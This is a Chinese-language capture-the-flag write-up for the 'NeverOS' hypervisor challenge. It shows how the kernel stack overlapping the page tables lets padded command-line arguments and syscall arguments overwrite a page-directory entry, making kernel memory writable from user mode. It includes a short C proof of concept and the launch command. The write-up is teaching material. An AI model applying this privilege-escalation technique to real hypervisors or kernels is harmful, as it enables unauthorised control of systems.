# NeverOS WP

### 漏洞点

1. 在hypervisor的setup_paging函数里，首先安装了这么的页表：

   ```c
   
   #define PS_LIMIT (0x200000)
   #define KERNEL_STACK_SIZE (0x4000)
   #define MAX_KERNEL_SIZE (PS_LIMIT - 0x5000 - KERNEL_STACK_SIZE)
   #define MEM_SIZE (PS_LIMIT * 0x10)
   
     uint64_t pml4_addr = MAX_KERNEL_SIZE;
     uint64_t *pml4 = (void*) (vm->mem + pml4_addr);
   
     uint64_t pdp_addr = pml4_addr + 0x1000;
     uint64_t *pdp = (void*) (vm->mem + pdp_addr);
   
     uint64_t pd_addr = pdp_addr + 0x1000;
     uint64_t *pd = (void*) (vm->mem + pd_addr);
   
     pml4[0] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pdp_addr;
     pdp[0] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pd_addr;
     pd[0] = PDE64_PRESENT | PDE64_RW | PDE64_PS; /* kernel only, no PED64_USER */
   
     sregs.cr3 = pml4_addr;
     sregs.cr4 = CR4_PAE;
   ```

   PDE_PS标志位开启，说明其映射的是一个2M（0x200000）的页到0地址；这部分接下来会作为内核代码的起始地址。

   从这段代码我们可以看见，内核最大的大小只能是0x1f7000, 接下来的0x5000空间是给内核页表使用的。`0~0x1000是pml，0x1000~0x2000是pdp，0x2000~0x3000是pd`。

2. 然后在kvm_init里会调用setup_regs函数去初始化虚拟机运行的寄存器：

   ```c
   regs.rip = entry;
   regs.rsp = MAX_KERNEL_SIZE + KERNEL_STACK_SIZE; /* temporary stack */
   regs.rdi = PS_LIMIT; /* start of free pages */
   regs.rsi = MEM_SIZE - regs.rdi; /* total length of free pages */
   regs.rflags = 0x2;
   ```

   可以看见，RSP被设置成了MAX_KERNEL_SIZE + KERNEL_STACK_SIZE，也就是MAX_KERNEL_SIZE + 0x4000 (0x1f7000+0x4000=0x1fb000 )。

3. 然后在执行内核代码之前，会调用copy_argv将hypervisor程序的第3个之后的参数压栈：

   ```c
   copy_argv(vm, argc - 2, &argv[2]);
   ```
4. 然后内核初始化自己页表，调用init_pagetable函数:

```c
/* Maps
 *  0x8000000000 ~ 0x8002000000 -> 0 ~ 0x2000000
 */
void init_pagetable() {
  uint64_t* pml4;
  asm("mov %[pml4], cr3" : [pml4]"=r"(pml4));
  uint64_t* pdp = (uint64_t*) ((uint64_t) pml4 + 0x3000);
  pml4[1] = PDE64_PRESENT | PDE64_RW | (uint64_t) pdp; // 0x8000000000
  uint64_t* pd = (uint64_t*) ((uint64_t) pdp + 0x1000);
  pdp[0] = PDE64_PRESENT | PDE64_RW | (uint64_t) pd;
  for(uint64_t i = 0; i < 0x10; i++)
    pd[i] = PDE64_PRESENT | PDE64_RW | PDE64_PS | (i * KERNEL_PAGING_SIZE);
}
```

  `pml4[1]`代表这个1级页表所表示的空间从0x8000000000（1<<47）开始到（1<< 48）-1。

   然后可以看见  MAX_KERNEL_SIZE+0x3000（0x1fa000）的部分作为pml4的第1项，然后MAX_KERNEL_SIZE+0x4000（0x1fb000）的部分作为pml4第1项的pdp的第0项，也就是pd的起始地址。

   MAX_KERNEL_SIZE+0x4000刚好是内核栈的栈顶，也就是通过系统调用（参数压入内核栈），我们可以修改pdp的内容。

   所以，我们的目标是，添加一个页表的表项，设置其标识位，使得我们可以在用户态访问这个页表的虚拟地址，这个页表的虚拟地址被同样映射到了虚拟机的物理0地址，也就是内核的起始地址。

### 尝试

  有了思路之后，我们就开始尝试利用。

*1*    我们需要mmap一块空间，使其作为pdp的项，这个表项的内容是0x87，代表其映射的地址是物理地址0，其标识位的为`PDE64_PRESENT | PDE64_RW | PDE64_USER| PDE64_PS` 。也就是用户态可以访问这个高地址。

*2*    我们需要算出前面mmap地址所对应的内核物理地址，将这个物理地址 |   PDE64_PRESENT | PDE64_RW | PDE64_USER ，填入pdp中作为其中的一项。 （这里查找mmap物理地址的方法是查找内存中的magic number）

*3*    但是因为PIE的原因，这个内核物理地址会改变，因为需要做一定的喷射，增加命中概率。

*4*     计算表项的所对应的虚拟地址（内核空间），在用户空间修改其内容就可以修改内核。

然而经过多次的尝试，可以发现这样是不可能成功。 因为 ` pml4[1] = PDE64_PRESENT | PDE64_RW | (uint64_t) pdp; `代码限制了页表的内容是不可以被用户空间所访问的，所以改变0x3000到0x4000的页表并不会生效。

### 利用

 然后注意到很关键的一个点，就是`pml[0]中的pdp[0]的pd`我们是可以有机会修改的，只要我们能把栈往前推一个页面的大小。又因为hypervisor的命令行参数会被压入内核栈中，所以在hypervisor中加入一个页面大小的garbage参数就可以完成前面的利用效果。

  POC：

```c
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <syscall.h>
#include <unistd.h>

//#define KERNEL_BASE ((char*)0xf740000000)
#define KERNEL_BASE ((char*)0x3b400000)  //hex((0xed0 >> 3)<< 21)
int main() {
  printf("Hello!\n");
  unsigned long edit = (long)KERNEL_BASE;
  char buf[22];
  syscall(0, 0, buf, 1, 0x87,0x87,0x87);
  *(long*)edit = 0xdeadbeef12345679;
  while(1){
    putchar(getchar());
    fflush(stdout);
  }
  return 0;
}
```

然后启动hypervisor:

```c
./hypervisor.elf kernel.bin ld.so ./user.elf `python -c 'print "a"*4096'`
```

### 最后

 感觉比赛的时候都没人仔细看这个题。

这个题的发现和利用需要做题人本身对操作系统中页表和地址转换的知识点比较熟悉。

感谢david942j在hitcon出了这么一个有趣的题目，让我学到了不少东西。

和操作系统搏斗比和libc搏斗有意思的多。 
